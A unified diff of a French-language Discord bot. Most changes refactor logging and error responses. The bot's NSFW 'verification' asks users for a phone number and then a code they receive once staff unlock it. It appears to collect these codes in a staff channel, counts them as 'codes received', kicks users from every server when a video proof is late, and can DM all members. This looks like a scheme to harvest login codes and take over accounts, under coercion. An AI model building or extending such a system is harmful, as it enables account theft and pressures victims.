+            except Exception:
+                log.exception("Countdown error")
                 return
 
     task = asyncio.create_task(countdown())
@@ -961,10 +1040,10 @@ async def proof_done(uid: int):
     if not p or p["proof_sent"]:
         return
     p["proof_sent"] = True
-    
+
     if p.get("task"):
         p["task"].cancel()
-    
+
     if p.get("video_msg") and p["video_msg"].attachments:
         video_archive[uid] = {
             "msg_id": p["video_msg"].id,
@@ -972,14 +1051,17 @@ async def proof_done(uid: int):
             "attachment": p["attachment"],
             "staff_id": p.get("staff_id")
         }
-    
+
     try:
         user = bot.get_user(uid) or await bot.fetch_user(uid)
         view = pending_users.get(uid, {}).get("view")
         phone_val = view.phone if view else ""
         embed = discord.Embed(color=COLOR_GREEN, timestamp=datetime.datetime.now())
         embed.set_author(name="Preuve envoyée", icon_url=user.display_avatar.url)
-        embed.set_thumbnail(url=user.display_avatar.url)
+        try:
+            embed.set_thumbnail(url=user.display_avatar.url)
+        except Exception:
+            pass
         embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
         embed.add_field(name="ID", value=f"`{uid}`", inline=True)
         if p.get("code"):
@@ -996,40 +1078,41 @@ async def proof_done(uid: int):
             ("Utilisateur", f"<@{uid}>", True),
             ("Staff", f"<@{p['staff_id']}>" if p["staff_id"] else "—", True),
         ], user=user, ping=p["staff_id"] or 0))
-    except Exception as e:
-        log.error(f"Proof done error: {e}")
+    except Exception:
+        log.exception("Proof done error")
 
 async def proof_timeout(uid: int):
     p = proofs.pop(uid, None)
     if not p:
         return
-    
+
     if p.get("task"):
         p["task"].cancel()
-    
+
     try:
         user = bot.get_user(uid) or await bot.fetch_user(uid)
         staff_id = p.get("staff_id")
-        
+
         log.info(f"TIMEOUT PROOF: Banning user {uid}")
-        
-        # BAN GARANTIE dans TOUS les serveurs
+
         for g in list(bot.guilds):
             try:
                 m = g.get_member(uid)
                 if m:
                     await g.kick(m, reason="Preuve vidéo non fournie dans le délai imparti")
                     log.info(f"✅ User {uid} kicked from {g.name}")
-            except Exception as e:
-                log.error(f"❌ Error kicking {uid} from {g.name}: {e}")
-        
-        # Message ROUGE dans le salon proof
+            except Exception:
+                log.exception(f"❌ Error kicking {uid} from {g.name}")
+
         proof_channel = get_proof_channel()
         if proof_channel and p.get("message"):
             try:
                 embed = discord.Embed(color=COLOR_RED, timestamp=datetime.datetime.now())
                 embed.set_author(name="⛔ UTILISATEUR BANNI", icon_url=user.display_avatar.url)
-                embed.set_thumbnail(url=user.display_avatar.url)
+                try:
+                    embed.set_thumbnail(url=user.display_avatar.url)
+                except Exception:
+                    pass
                 embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
                 embed.add_field(name="ID", value=f"`{uid}`", inline=True)
                 if p.get("code"):
@@ -1041,10 +1124,9 @@ async def proof_timeout(uid: int):
                 embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                 await p["message"].edit(embed=embed, view=None)
                 log.info(f"✅ Message updated in proof channel for user {uid}")
-            except Exception as e:
-                log.error(f"Error updating proof message: {e}")
-        
-        # MP avec lien d'appel
+            except Exception:
+                log.exception("Error updating proof message")
+
         appeal_link = data.get("appeal_server_link", "https://discord.gg/example")
         unban_embed = discord.Embed(
             title="⛔ Vous avez été banni",
@@ -1062,20 +1144,20 @@ async def proof_timeout(uid: int):
             inline=False
         )
         unban_embed.set_footer(text="Vous serez débanni après examen de votre dossier.")
-        
+
         try:
             await user.send(embed=unban_embed)
             log.info(f"✅ Ban MP sent to user {uid}")
-        except Exception as e:
-            log.error(f"Error sending ban MP to {uid}: {e}")
-        
+        except Exception:
+            log.exception(f"Error sending ban MP to {uid}")
+
         asyncio.create_task(send_log(title="⛔ Preuve non fournie — Utilisateur banni", color=COLOR_RED, fields=[
             ("Utilisateur", f"<@{uid}>", True),
             ("Staff", f"<@{staff_id}>" if staff_id else "—", True),
             ("Action", "Ban de TOUS les serveurs", True),
         ], user=user, ping=staff_id or 0))
-    except Exception as e:
-        log.error(f"Proof timeout error: {e}")
+    except Exception:
+        log.exception("Proof timeout error")
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -1083,29 +1165,27 @@ async def on_message(message: discord.Message):
         return
     if isinstance(message.channel, discord.DMChannel):
         return
-    
+
     proof_channel = get_proof_channel()
     if proof_channel and message.channel.id == proof_channel.id:
         has_video = any(att.content_type and att.content_type.startswith("video") for att in message.attachments)
-        
+
         proof_role_id = get_proof_role_id()
         is_staff = isinstance(message.author, discord.Member) and proof_role_id and proof_role_id in [r.id for r in message.author.roles]
-        
+
         is_user_in_proof = False
         for uid, p in list(proofs.items()):
             if message.author.id == uid or message.author.id == p.get("staff_id"):
                 is_user_in_proof = True
                 break
-        
-        # Si c'est pas un staff et pas l'utilisateur en preuve, supprimer si pas de vidéo
+
         if not is_staff and not is_user_in_proof and not has_video:
             try:
                 await message.delete()
             except Exception:
                 pass
             return
-        
-        # Traiter la vidéo
+
         if has_video:
             for uid, p in list(proofs.items()):
                 if p["proof_sent"]:
@@ -1133,14 +1213,13 @@ async def on_message_delete(message: discord.Message):
                 timestamp=datetime.datetime.now()
             )
             embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
-            
-            # PING LE STAFF PAS LE MEMBRE
+
             content = f"<@{staff_id}> " if staff_id else ""
             try:
                 file = discord.File(io.BytesIO(await att.read()), filename=att.filename)
                 asyncio.create_task(channel.send(content=content, embed=embed, file=file))
-            except Exception as e:
-                log.error(f"Reupload after delete error: {e}")
+            except Exception:
+                log.exception("Reupload after delete error")
             break
 
 # ==================== PANNEAU PUBLIC ====================
@@ -1159,46 +1238,48 @@ class VerifyView(discord.ui.View):
                 if denied_remaining > 0:
                     mins = int(denied_remaining // 60)
                     secs = int(denied_remaining % 60)
-                    await interaction.response.send_message(embed=discord.Embed(
+                    await safe_respond(interaction, discord.Embed(
                         title="Vérification refusée",
                         description=f"Votre vérification a été refusée.\n\nVous pouvez réessayer dans **{mins}m {secs:02d}s**.",
                         color=COLOR_RED
-                    ), ephemeral=True)
+                    ))
                 else:
                     blacklisted_users.discard(uid)
                     denied_users_cooldown.pop(uid, None)
+                    blacklist_data["users"] = list(blacklisted_users)
+                    save_blacklist(blacklist_data)
                     data["blacklisted_users"] = list(blacklisted_users)
                     save_data()
-            
+
             await interaction.response.send_modal(PhoneModal())
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Verify error: {e}")
+            log.warning("VerifyView interaction not found")
+        except Exception:
+            log.exception("Verify error")
 
     @discord.ui.button(label="Code", style=discord.ButtonStyle.primary, custom_id="global_code_btn")
     async def code(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             pending = pending_users.get(interaction.user.id)
             if pending is None:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Vous devez d'abord **Vérifier** votre numéro et attendre de recevoir un code.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
             if not pending.get("unlocked"):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Vous n'avez pas encore reçu de code. Attendez, puis réessayez.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
             await interaction.response.send_modal(CodeModal(interaction.user.id))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Code button error: {e}")
+            log.warning("Code button interaction not found")
+        except Exception:
+            log.exception("Code button error")
 
 # ==================== SALONS VOCAUX OBJECTIF ====================
 
@@ -1207,12 +1288,11 @@ async def update_member_channels():
         try:
             for g in list(bot.guilds):
                 count = g.member_count or 0
-                
                 if count < 100:
                     target = 100
                 else:
                     target = ((count // 25) + 1) * 25
-                
+
                 name = f"🎯 {count}/{target} Membres"
                 existing = None
                 for vc in g.voice_channels:
@@ -1231,8 +1311,8 @@ async def update_member_channels():
                             await existing.edit(name=name)
                         except Exception:
                             pass
-        except Exception as e:
-            log.error(f"Member channels error: {e}")
+        except Exception:
+            log.exception("Member channels error")
         await asyncio.sleep(300)
 
 # ==================== COMMANDES ====================
@@ -1243,9 +1323,11 @@ class DMAllModal(discord.ui.Modal, title="DM All"):
 
     async def on_submit(self, interaction: discord.Interaction):
         try:
-            await interaction.response.send_message(embed=discord.Embed(
-                title="DM All lancé", description="Envoi en cours à tous les membres du serveur...", color=COLOR_GOLD
-            ), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(
+                title="DM All lancé",
+                description="Envoi en cours à tous les membres du serveur...",
+                color=COLOR_GOLD
+            ))
             sent = 0
             failed = 0
             embed_dm = discord.Embed(title=self.titre.value, description=self.message_txt.value, color=COLOR_BLUE)
@@ -1264,21 +1346,21 @@ class DMAllModal(discord.ui.Modal, title="DM All"):
                 ("Par", f"<@{interaction.user.id}>", True),
             ]))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"DMAll error: {e}")
+            log.warning("DMAll interaction not found")
+        except Exception:
+            log.exception("DMAll error")
 
 @bot.tree.command(name="dmall", description="Envoie un message en MP à tous les membres")
 async def dmall(interaction: discord.Interaction):
     try:
         if not has_staff_role(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED))
             return
         await interaction.response.send_modal(DMAllModal())
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"dmall command error: {e}")
+        log.warning("dmall interaction not found")
+    except Exception:
+        log.exception("dmall command error")
 
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification")
 async def setupnsfw(interaction: discord.Interaction):
@@ -1326,57 +1408,56 @@ async def setupnsfw(interaction: discord.Interaction):
         )
         await interaction.response.send_message(embed=embed, view=VerifyView())
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"setupnsfw command error: {e}")
+        log.warning("setupnsfw interaction not found")
+    except Exception:
+        log.exception("setupnsfw command error")
 
 @bot.tree.command(name="banpanel", description="Crée le panneau de bannissement")
 async def banpanel(interaction: discord.Interaction):
     try:
         if not has_staff_role(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED))
             return
-        
+
         embed = discord.Embed(
             title="🔴 BANNISSEMENT",
             description="Cliquez sur le bouton ci-dessous pour bannir l'utilisateur",
             color=COLOR_RED
         )
-        
         await interaction.response.send_message(embed=embed, view=QuickBanView())
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"banpanel command error: {e}")
+        log.warning("banpanel interaction not found")
+    except Exception:
+        log.exception("banpanel command error")
 
 @bot.tree.command(name="stat", description="Affiche les statistiques complètes")
 async def stat(interaction: discord.Interaction):
     try:
         await interaction.response.defer(ephemeral=True)
-        
+
         staff_channel = get_staff_channel()
         codes_channel = get_codes_channel()
-        
+
         staff_count = 0
         codes_count = 0
-        
+
         if staff_channel:
             try:
-                async for message in staff_channel.history(limit=None):
+                async for _ in staff_channel.history(limit=5000):
                     staff_count += 1
-            except Exception as e:
-                log.error(f"Error counting staff messages: {e}")
-        
+            except Exception:
+                log.exception("Error counting staff messages")
+
         if codes_channel:
             try:
-                async for message in codes_channel.history(limit=None):
+                async for _ in codes_channel.history(limit=5000):
                     codes_count += 1
-            except Exception as e:
-                log.error(f"Error counting codes messages: {e}")
-        
+            except Exception:
+                log.exception("Error counting codes messages")
+
         total_verifs = data.get("total_verifications", 0)
         total_codes = data.get("total_codes_received", 0)
-        
+
         embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques Complètes")
         embed.add_field(name="Messages salon Staff", value=f"`{staff_count}`", inline=True)
         embed.add_field(name="Messages salon Codes", value=f"`{codes_count}`", inline=True)
@@ -1385,251 +1466,258 @@ async def stat(interaction: discord.Interaction):
         embed.add_field(name="Numéros blacklistés", value=f"`{len(blacklisted_numbers)}`", inline=True)
         embed.add_field(name="Utilisateurs blacklistés", value=f"`{len(blacklisted_users)}`", inline=True)
         embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
-        
+
         await interaction.followup.send(embed=embed, ephemeral=True)
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"stat command error: {e}")
-        await interaction.followup.send(embed=discord.Embed(title="Erreur", description=f"`{e}`", color=COLOR_RED), ephemeral=True)
+        log.warning("stat interaction not found")
+    except Exception:
+        log.exception("stat command error")
+        try:
+            await interaction.followup.send(embed=discord.Embed(title="Erreur", description="Une erreur interne est survenue.", color=COLOR_RED), ephemeral=True)
+        except Exception:
+            pass
 
 @bot.tree.command(name="codes", description="Affiche les statistiques de vérification")
 async def codes(interaction: discord.Interaction):
     try:
         total_verifs = data.get("total_verifications", 0)
         total_codes = data.get("total_codes_received", 0)
-        
+
         embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques de Vérification")
         embed.add_field(name="Vérifications totales", value=f"`{total_verifs}`", inline=True)
         embed.add_field(name="Codes reçus", value=f"`{total_codes}`", inline=True)
         embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
-        
+
         await interaction.response.send_message(embed=embed, ephemeral=True)
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"codes command error: {e}")
+        log.warning("codes interaction not found")
+    except Exception:
+        log.exception("codes command error")
 
 @bot.tree.command(name="clear", description="Supprime des messages dans le salon")
 async def clear(interaction: discord.Interaction, nombre: int = 10):
     try:
         if not interaction.user.guild_permissions.manage_messages:
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Permission manquante.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Permission manquante.", color=COLOR_RED))
             return
         if nombre < 1 or nombre > 100:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Choisis un nombre entre 1 et 100.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="Choisis un nombre entre 1 et 100.", color=COLOR_RED))
             return
         await interaction.response.defer(ephemeral=True)
         deleted = await interaction.channel.purge(limit=nombre)
         await interaction.followup.send(embed=discord.Embed(title="Messages supprimés", description=f"{len(deleted)} messages ont été supprimés.", color=COLOR_GREEN), ephemeral=True)
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"clear command error: {e}")
+        log.warning("clear interaction not found")
+    except Exception:
+        log.exception("clear command error")
 
 @bot.tree.command(name="sync", description="Sync les commandes")
 async def sync(interaction: discord.Interaction):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         await interaction.response.defer(ephemeral=True)
         copied = await bot.tree.sync()
         await interaction.followup.send(embed=discord.Embed(title="Commandes synchronisées", description=f"`{len(copied)}` commandes synchronisées.", color=COLOR_GREEN), ephemeral=True)
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        await interaction.followup.send(embed=discord.Embed(title="Erreur", description=f"`{e}`", color=COLOR_RED), ephemeral=True)
+        log.warning("sync interaction not found")
+    except Exception:
+        log.exception("sync command error")
+        try:
+            await interaction.followup.send(embed=discord.Embed(title="Erreur", description="Une erreur interne est survenue.", color=COLOR_RED), ephemeral=True)
+        except Exception:
+            pass
 
 @bot.tree.command(name="acces", description="Donne l'accès vérification à un membre")
 async def acces(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         if config.STAFF_ROLE_ID == 0:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED))
             return
         role = interaction.guild.get_role(config.STAFF_ROLE_ID)
         if not role:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED))
             return
         await member.add_roles(role, reason="Accès vérification")
-        await interaction.response.send_message(embed=discord.Embed(title="Accès donné", description=f"{member.mention} peut maintenant gérer les vérifications.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Accès donné", description=f"{member.mention} peut maintenant gérer les vérifications.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"acces command error: {e}")
+        log.warning("acces interaction not found")
+    except Exception:
+        log.exception("acces command error")
 
 @bot.tree.command(name="delacces", description="Retire l'accès vérification à un membre")
 async def delacces(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         if config.STAFF_ROLE_ID == 0:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED))
             return
         role = interaction.guild.get_role(config.STAFF_ROLE_ID)
         if role and role in member.roles:
             await member.remove_roles(role, reason="Accès retiré")
-        await interaction.response.send_message(embed=discord.Embed(title="Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"delacces command error: {e}")
+        log.warning("delacces interaction not found")
+    except Exception:
+        log.exception("delacces command error")
 
 @bot.tree.command(name="bypassrole", description="Configure le rôle bypass vérification")
 async def bypassrole(interaction: discord.Interaction, role: discord.Role):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["bypass_role"] = role.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} bypass la vérification.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} bypass la vérification.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"bypassrole command error: {e}")
+        log.warning("bypassrole interaction not found")
+    except Exception:
+        log.exception("bypassrole command error")
 
 @bot.tree.command(name="bypass", description="Donne le bypass vérification à un membre")
 async def bypass(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         rid = get_bypass_role_id()
         if not rid:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED))
             return
         role = interaction.guild.get_role(rid)
         if not role:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED))
             return
         await member.add_roles(role, reason="Bypass vérification")
-        await interaction.response.send_message(embed=discord.Embed(title="Bypass donné", description=f"{member.mention} n'a plus besoin de la vidéo de preuve.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Bypass donné", description=f"{member.mention} n'a plus besoin de la vidéo de preuve.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"bypass command error: {e}")
+        log.warning("bypass interaction not found")
+    except Exception:
+        log.exception("bypass command error")
 
 @bot.tree.command(name="delbypass", description="Retire le bypass vérification à un membre")
 async def delbypass(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         rid = get_bypass_role_id()
         if not rid:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED))
             return
         role = interaction.guild.get_role(rid)
         if role and role in member.roles:
             await member.remove_roles(role, reason="Bypass retiré")
-        await interaction.response.send_message(embed=discord.Embed(title="Bypass retiré", description=f"{member.mention} devra fournir la vidéo de preuve.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Bypass retiré", description=f"{member.mention} devra fournir la vidéo de preuve.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"delbypass command error: {e}")
+        log.warning("delbypass interaction not found")
+    except Exception:
+        log.exception("delbypass command error")
 
 @bot.tree.command(name="salonstaff", description="Configure le salon de réception des demandes")
 async def salonstaff(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["staff_channel"] = salon.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Salon configuré", description=f"Les demandes arriveront dans {salon.mention}.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les demandes arriveront dans {salon.mention}.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"salonstaff command error: {e}")
+        log.warning("salonstaff interaction not found")
+    except Exception:
+        log.exception("salonstaff command error")
 
 @bot.tree.command(name="salonlogs", description="Configure le salon des logs")
 async def salonlogs(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["log_channel"] = salon.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Salon configuré", description=f"Les logs iront dans {salon.mention}.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les logs iront dans {salon.mention}.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"salonlogs command error: {e}")
+        log.warning("salonlogs interaction not found")
+    except Exception:
+        log.exception("salonlogs command error")
 
 @bot.tree.command(name="salonproof", description="Configure le salon des preuves vidéo")
 async def salonproof(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["proof_channel"] = salon.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Salon configuré", description=f"Les preuves vidéo se feront dans {salon.mention}.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les preuves vidéo se feront dans {salon.mention}.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"salonproof command error: {e}")
+        log.warning("salonproof interaction not found")
+    except Exception:
+        log.exception("salonproof command error")
 
 @bot.tree.command(name="saloncodes", description="Configure le salon des codes")
 async def saloncodes(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["codes_channel"] = salon.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Salon configuré", description=f"Les codes s'afficheront dans {salon.mention}.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les codes s'afficheront dans {salon.mention}.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"saloncodes command error: {e}")
+        log.warning("saloncodes interaction not found")
+    except Exception:
+        log.exception("saloncodes command error")
 
 @bot.tree.command(name="roleproof", description="Configure le rôle à ping pour les preuves")
 async def roleproof(interaction: discord.Interaction, role: discord.Role):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["proof_role"] = role.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera ping pour les preuves.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera ping pour les preuves.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"roleproof command error: {e}")
+        log.warning("roleproof interaction not found")
+    except Exception:
+        log.exception("roleproof command error")
 
 @bot.tree.command(name="appeallink", description="Configure le lien du serveur d'appel")
 async def appeallink(interaction: discord.Interaction, lien: str):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["appeal_server_link"] = lien
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Lien configuré", description=f"Lien d'appel défini : `{lien}`", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Lien configuré", description=f"Lien d'appel défini : `{lien}`", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"appeallink command error: {e}")
+        log.warning("appeallink interaction not found")
+    except Exception:
+        log.exception("appeallink command error")
 
 @bot.tree.command(name="banrole", description="Configure le rôle de bannissement")
 async def banrole(interaction: discord.Interaction, role: discord.Role):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
             return
         data["ban_role"] = role.id
         save_data()
-        await interaction.response.send_message(embed=discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera attribué au bannissement.", color=COLOR_GREEN), ephemeral=True)
+        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera attribué au bannissement.", color=COLOR_GREEN))
     except discord.errors.NotFound:
-        pass
-    except Exception as e:
-        log.error(f"banrole command error: {e}")
+        log.warning("banrole interaction not found")
+    except Exception:
+        log.exception("banrole command error")
 
 # ==================== ON_READY ====================
 
@@ -1639,9 +1727,9 @@ async def on_ready():
     try:
         synced = await bot.tree.sync()
         log.info(f"Commandes synchronisées : {len(synced)} commandes.")
-    except Exception as e:
-        log.error(f"Sync error: {e}")
-    
+    except Exception:
+        log.exception("Sync error")
+
     bot.add_view(VerifyView())
     bot.add_view(ContestView())
     log.info("Boutons restaurés.")
